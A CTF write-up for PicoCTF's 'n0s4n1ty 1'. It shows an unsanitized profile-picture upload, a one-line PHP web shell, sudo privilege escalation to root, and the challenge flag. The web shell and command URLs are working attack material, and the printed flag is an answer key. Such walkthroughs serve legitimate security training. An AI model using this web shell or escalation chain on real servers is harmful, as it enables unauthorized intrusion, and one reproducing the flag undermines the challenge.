### 📌 **Write-up for PicoCTF Challenge: n0s4n1ty 1**

---

## **📝 Challenge Overview**
A developer has added **profile picture upload functionality** to a website. However, the implementation is flawed, allowing us to **exploit the system**.  
Our goal is to **find the hidden flag located in the `/root` directory`.**

---

## **🔑 Hints**
1. **"File upload was not sanitized"** → There might be a **file upload vulnerability**, allowing us to upload **arbitrary PHP code**.
2. **"Whenever you get a shell on a remote machine, check `sudo -l`"** → This suggests we can escalate privileges using `sudo`.

---

## **🛠️ Step 1: Exploring the Web Application**
1. Access the challenge website:
   ```
   http://standard-pizzas.picoctf.net:51555/
   ```
2. Locate the **profile picture upload feature**.
3. Upload a `.jpg` image to check how the website stores files.

---

## **🚀 Step 2: Exploiting File Upload Vulnerability**
Since **file upload is not sanitized**, we can upload a **malicious PHP shell**.

### **📜 Creating a Malicious Web Shell**
1. Create a file called `shell.php` with the following code:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   - This script takes a parameter `cmd` from the URL and executes it.
   - Example: `?cmd=ls` lists files in the current directory.

2. Upload `shell.php` through the profile picture upload.

3. Check the location of the uploaded file:
   ```
   http://standard-pizzas.picoctf.net:51555/uploads/shell.php
   ```

✅ If this works, we **now have remote command execution (RCE)!**

---

## **🔍 Step 3: Executing Commands on the Server**
### **✅ Verify RCE**
Run:
```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=ls
```
Expected output:
```
1619046.png  shell.php
```
🎯 **Confirmed: We have command execution!**

### **🔍 Checking User Privileges**
Run:
```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=id
```
Expected output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
📌 We are **running as `www-data` (a low-privilege user).**

### **🔍 Checking `sudo` Permissions**
Since the challenge hints at `sudo -l`, we run:
```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=sudo%20-l
```
Expected output:
```
User www-data may run the following commands:
    (ALL) NOPASSWD: ALL
```
✅ This means we can run **ANY command as root without a password!** 🎉

---

## **🛠️ Step 4: Privilege Escalation**
Since we have unrestricted `sudo` access, we can **run commands as root**.

### **🔹 Verify Root Access**
Run:
```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=sudo%20whoami
```
Expected output:
```
root
```
✅ **We now have full root access!** 🏆

### **📌 Read the Flag**
Since the flag is in `/root/`, run:
```
http://standard-pizzas.picoctf.net:51555/uploads/shell.php?cmd=sudo%20cat%20/root/flag.txt
```
Expected output:
```
picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}
```
🎉 **Challenge Solved!** 🚀
